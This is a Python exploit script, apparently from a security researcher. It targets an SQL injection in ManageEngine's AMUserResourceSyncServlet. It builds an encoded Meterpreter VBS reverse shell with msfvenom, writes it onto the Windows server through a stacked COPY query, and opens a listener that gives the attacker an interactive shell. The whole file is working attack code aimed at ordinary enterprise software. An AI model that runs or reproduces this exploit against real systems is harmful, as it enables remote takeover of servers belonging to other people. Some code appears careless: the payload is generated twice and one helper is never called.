#!/usr/bin/env python3

"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: RCE exploit for an SQL Injection identified in the ManageEngine AMUserResourceSyncServlet servlet.
Works on Windows Systems by copying a vbs reverse shell.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import subprocess
import base64
import threading
import socket


def remove_tabs(input_string):
    """
    Takes a string, input_string, and removes all the tabs from the string.
    The function returns the tab-less string.

    Args:
        input_string (str): The input string from which tabs are to be removed.

    Returns:
        str: A string with all tabs removed.
    """

    return input_string.replace("\t", "")

def replace_carriage_returns(input_string):
    """
    Takes a string, input_string, and replaces all the carriage returns with a colon.
    The function returns the new string.

    Args:
        input_string (str): The input string where carriage returns need to be replaced.

    Returns:
        str: A string with carriage returns replaced by colons.
    """
    
    return input_string.replace("\n", ":")

def replace_double_colons(input_string):
    """
    Takes a string, input_string, and replaces all double colons ('::') with a single colon (':').
    The function returns the new string.

    Args:
        input_string (str): The input string where double colons need to be replaced.

    Returns:
        str: A string with double colons replaced by single colons.
    """

    return input_string.replace("::", ":")

def base64_encode(input_string):
    """
    Takes a string, input_string, and returns a base64 encoded version of input_string.

    Args:
        input_string (str): The input string to be base64 encoded.

    Returns:
        str: The base64 encoded version of the input string.
    """
    
    if isinstance(input_string, str):
        input_string = input_string.encode('utf-8')
    # Encode the bytes to Base64
    encoded_data = base64.b64encode(input_string)
    # Convert the encoded bytes back to a string and return
    return encoded_data.decode('utf-8')

def gen_rev_shell(host, port):
    """
    Generates a VBS reverse shell using MSFvenom, with the specified host and port.
    Returns the generated reverse shell.

    Args:
        host (str): The listening host for the reverse shell.
        port (int): The listening port for the reverse shell.

    Returns:
        str: The reverse shell payload generated by MSFvenom.
    """

    print("Generating Exploit With MSF Venom. Please Wait...")
    msf_output = 'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -f vbs'.format(lhost = host, lport = port)
    rev_shell = subprocess.run(msf_output,  shell=True, text=True, capture_output=True).stdout
    rev_shell = subprocess.run(msf_output,  shell=True, text=True, capture_output=True).stdout
    return rev_shell

def revShellCopyTo(url, revshell):
    """
    Constructs an SQL injection payload to copy the reverse shell to the target server.

    Args:
        url (str): The URL of the ManageEngine instance.
        revshell (str): The reverse shell payload to be copied.

    Returns:
        requests.Response: The HTTP response object from the target server.

    """

    copy_to =  ';copy+(select+convert_from(decode($${shell}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;'.format(shell=revshell)
    return requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
					  params='ForMasRange=1&userId=1%s' % copy_to, verify=False)


# Reverse shell request function
def send_rev_shell_request(target, revshell, event):
    """
    Sends the reverse shell payload to a vulnerable ManageEngine instance.

    Args:
        target (str): The target ManageEngine server.
        revshell (str): The reverse shell payload.
        event (threading.Event): A threading event to signal request completion.

    Returns:
        int: 0 if the socket server runs successfully, 1 otherwise.
    """
    
    try:
        copy_to = ';copy+(select+convert_from(decode($${shell}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;'.format(shell=revshell)
        r = requests.get(
            'https://%s:8443/servlet/AMUserResourcesSyncServlet' % target,
            params={'ForMasRange': 1, 'userId': f'1{copy_to}'},
            verify=False
        )
        print("[+] Web request sent successfully.")
        event.set()
        return 0  # Signal that the request is complete
    except Exception as e:
        print(f"[-] Error sending web request: {e}")
        return 1

# Socket server function
def setup_socket_server(port, event):
    """
    Sets up a socket server to listen for reverse shell connections.

    Args:
        port (int): The port on which to listen.
        event (threading.Event): A threading event to wait for the reverse shell request.

    Returns:
        int: 0 if the socket server runs successfully, 1 otherwise.

    """

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('0.0.0.0', int(port)))
        server_socket.listen(1)
        print(f"[+] Listening on port {port}...")
        event.wait()  # Wait for the web request to finish
        print("[+] Reverse shell request completed. Waiting for a connection...")

        conn, addr = server_socket.accept()
        print(f"[+] Connection established with {addr}")
        
        try:
            while True:
                cmd = input("Shell> ")
                if cmd.lower() in ('exit', 'quit'):
                    break
                conn.sendall(cmd.encode() + b'\n')
                data = conn.recv(1024)
                print(data.decode(), end="")
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
        finally:
            conn.close()
            return 0
    return 1

# Main function
def main():
    """
    Main function to execute the exploit. It accepts three command-line arguments:
    target (the vulnerable server), lhost (listening host), and lport (listening port).

    Returns:
        int: 0 if the socket server runs successfully, 1 otherwise.

    """
        
    if len(sys.argv) != 4:
        print(f"(+) usage: {sys.argv[0]} <target> <lhost> <lport>")
        print(f"(+) eg: {sys.argv[0]} 192.168.1.10 192.168.1.100 4444")
        sys.exit(1)
    
    # Arguments
    target = sys.argv[1]
    host = sys.argv[2]
    port = sys.argv[3]
    
    # Generate Reverse Shell
    revshell = gen_rev_shell(host, port)
    
    # Multi-threaded loop to get listener
    event = threading.Event()
    request_thread = threading.Thread(target=send_rev_shell_request, args=(target, revshell, event))
    socket_thread = threading.Thread(target=setup_socket_server, args=(port, event))
    
    request_thread.start()
    socket_thread.start()
    
    # Wait for both threads to complete
    request_thread.join()
    socket_thread.join()

    return 0

if __name__ == '__main__':
    main()